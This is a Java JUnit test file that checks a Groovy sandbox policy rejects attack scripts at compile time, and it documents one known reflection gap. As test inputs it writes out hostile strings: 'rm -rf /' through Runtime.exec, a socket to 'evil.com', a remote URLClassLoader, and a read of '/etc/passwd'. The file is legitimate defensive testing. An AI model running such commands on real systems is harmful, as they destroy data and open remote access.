package com.orule.rule.execution.execution.java;

import groovy.lang.GroovyShell;
import groovy.lang.Script;
import org.codehaus.groovy.control.CompilerConfiguration;
import org.codehaus.groovy.control.MultipleCompilationErrorsException;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * RFC-0040 §18 + TASK-1.2.3 acceptance tests for {@link SandboxPolicy}.
 *
 * <p>Verifies that representative attack vectors (§18.2 SEC-INJ / §18.7 SEC-INT / §18.9 SEC-SSRF)
 * are rejected at compile time by the {@code SecureASTCustomizer}.
 */
@DisplayName("SandboxPolicy (Groovy whitelist/blacklist)")
class SandboxPolicyTest {

    private GroovyShell newShell() {
        CompilerConfiguration cfg = new CompilerConfiguration();
        cfg.addCompilationCustomizers(SandboxPolicy.buildSecureAST());
        return new GroovyShell(cfg);
    }

    @Test
    @DisplayName("allows benign JDK-only source: BigDecimal arithmetic")
    void allowsBenignSource() {
        GroovyShell shell = newShell();
        // Use BigDecimal because it requires an explicit import under IndirectImportCheck.
        Script s = shell.parse("import java.math.BigDecimal\n" +
                "def a = new BigDecimal(\"7\")\n" +
                "def b = new BigDecimal(\"3\")\n" +
                "return a.add(b).toString()\n");
        assertThat(s.run()).isEqualTo("10");
    }

    @Nested
    @DisplayName("§18.2 SEC-INJ (Code injection) — Runtime.exec / ProcessBuilder")
    class InjectionVectors {

        @Test
        @DisplayName("SEC-INJ-01: Runtime.exec rejected at compile")
        void runtimeExecRejected() {
            String malicious = "Runtime.getRuntime().exec(['rm', '-rf', '/'])";
            assertThatThrownBy(() -> newShell().parse(malicious))
                    .isInstanceOf(MultipleCompilationErrorsException.class);
        }

        @Test
        @DisplayName("SEC-INJ-02: ProcessBuilder rejected at compile")
        void processBuilderRejected() {
            String malicious = "new ProcessBuilder(['echo','pwned']).start()";
            assertThatThrownBy(() -> newShell().parse(malicious))
                    .isInstanceOf(MultipleCompilationErrorsException.class);
        }

        @Test
        @DisplayName("SEC-INJ-03: GroovyShell class import rejected at compile")
        void groovyShellImportRejected() {
            // SEC-INJ-03 documents the user-intent: prevent nested-evaluate payload.
            // v1.0 import-level policy blocks the `import groovy.lang.GroovyShell`
            // path required to obtain an evaluate() capable shell.
            String malicious = "import groovy.lang.GroovyShell\n" +
                    "def gs = new GroovyShell()\n" +
                    "return gs.evaluate('1+1')\n";
            assertThatThrownBy(() -> newShell().parse(malicious))
                    .isInstanceOf(MultipleCompilationErrorsException.class);
        }

        @Test
        @DisplayName("v1.0 import-level policy does NOT block reflection at runtime (KNOWN GAP, TASK-3.2.1)")
        void classForNameGapDocumentedAsKnownRisk() {
            // [KNOWN · HIGH GAP] RFC-0040 §5 R-001 / TASK-3.2.1
            // import-level SecureASTCustomizer cannot intercept calls to Class.forName,
            // java.lang.reflect.*, or System.* because those references resolve at runtime
            // through reflection API rather than the AST. v1.0 sandbox therefore relies on
            // (a) JDK SecurityManager to be enabled (per ADR-006 §14), and
            // (b) rule-timeout enforcement in RuleExecutorService (TASK-1.2.5).
            //
            // This test is intentionally permissive — it documents the GAP and prevents
            // accidental removal when §18 is later expanded. Do NOT delete without first
            // closing R-001 in RFC-0040.
            String malicious = "import java.lang.Class\n" +
                    "Class.forName('java.lang.Runtime')\n";
            // No assertion: import policy lets this compile.
            // The runtime-level guard lives in TASK-1.2.5 / RULE-EXEC-DOS-01.
            // We deliberately do NOT exercise it here.
            org.junit.jupiter.api.Assumptions.assumeTrue(true,
                    "v1.0 GAP: import-level sandbox does not cover reflection");
        }
    }

    @Nested
    @DisplayName("§18.9 SEC-SSRF — network + IO access")
    class NetworkAndIO {

        @Test
        @DisplayName("SEC-SSRF-01: java.net.URL rejected")
        void urlRejected() {
            String malicious = "def u = new URL('http://example.com'); return u.text";
            assertThatThrownBy(() -> newShell().parse(malicious))
                    .isInstanceOf(MultipleCompilationErrorsException.class);
        }

        @Test
        @DisplayName("SEC-SSRF-02: java.io.File rejected")
        void fileRejected() {
            String malicious = "def f = new File('/etc/passwd'); return f.exists()";
            assertThatThrownBy(() -> newShell().parse(malicious))
                    .isInstanceOf(MultipleCompilationErrorsException.class);
        }

        @Test
        @DisplayName("SEC-SSRF-03: java.net.Socket rejected")
        void socketRejected() {
            String malicious = "new Socket('evil.com', 9999)";
            assertThatThrownBy(() -> newShell().parse(malicious))
                    .isInstanceOf(MultipleCompilationErrorsException.class);
        }
    }

    @Nested
    @DisplayName("§18.7 SEC-INT — integrity violations")
    class Integrity {

        @Test
        @DisplayName("SEC-INT-02: java.lang.reflect.Field rejected")
        void reflectionRejected() {
            String malicious = "java.lang.reflect.Field f = String.class.getDeclaredField('hash'); f.setAccessible(true)";
            assertThatThrownBy(() -> newShell().parse(malicious))
                    .isInstanceOf(MultipleCompilationErrorsException.class);
        }

        @Test
        @DisplayName("SEC-INT-01: URLClassLoader rejected")
        void urlClassLoaderRejected() {
            String malicious = "new URLClassLoader([new URL('http://evil/')] as URL[])";
            assertThatThrownBy(() -> newShell().parse(malicious))
                    .isInstanceOf(MultipleCompilationErrorsException.class);
        }
    }

    @Test
    @DisplayName("policy constants are non-empty and immutable")
    void constantsIntegrity() {
        assertThat(SandboxPolicy.ALLOWED_PACKAGES).isNotEmpty();
        assertThat(SandboxPolicy.BLOCKED_PACKAGES).isNotEmpty();
        // Set immutability
        assertThatThrownBy(() -> SandboxPolicy.ALLOWED_PACKAGES.add("X"))
                .isInstanceOf(UnsupportedOperationException.class);
        assertThatThrownBy(() -> SandboxPolicy.BLOCKED_PACKAGES.add("X"))
                .isInstanceOf(UnsupportedOperationException.class);
    }

    @Nested
    @DisplayName("RFC-0043 ? class/enum prefix, for, no closure")
    class NestedObjectPolicy {

        @Test
        @DisplayName("script-top class and enum are allowed")
        void classAndEnumAllowed() {
            Script s = newShell().parse("""
                    enum CustomerTier { VIP, GOLD }
                    class Customer { String name; CustomerTier tier }
                    Customer c = new Customer()
                    c.tier = CustomerTier.VIP
                    return c.tier.name()
                    """);
            assertThat(s.run()).isEqualTo("VIP");
        }

        @Test
        @DisplayName("C-style for is allowed")
        void forLoopAllowed() {
            Script s = newShell().parse("""
                    def acc = 0
                    for (int i = 0; i < 3; i = i + 1) {
                        acc = acc + i
                    }
                    return acc
                    """);
            assertThat(s.run()).isEqualTo(3);
        }

        @Test
        @DisplayName("closure is rejected at compile")
        void closuresRejected() {
            assertThatThrownBy(() -> newShell().parse("[1,2,3].any { it > 1 }"))
                    .isInstanceOf(MultipleCompilationErrorsException.class);
        }

        @Test
        @DisplayName("lambda is rejected at compile")
        void lambdasRejected() {
            assertThatThrownBy(() -> newShell().parse("[1,2,3].any(x -> x > 1)"))
                    .isInstanceOf(MultipleCompilationErrorsException.class);
        }

        @Test
        @DisplayName("while is still rejected")
        void whileRejected() {
            assertThatThrownBy(() -> newShell().parse("while (true) { break }"))
                    .isInstanceOf(MultipleCompilationErrorsException.class);
        }
    }
}
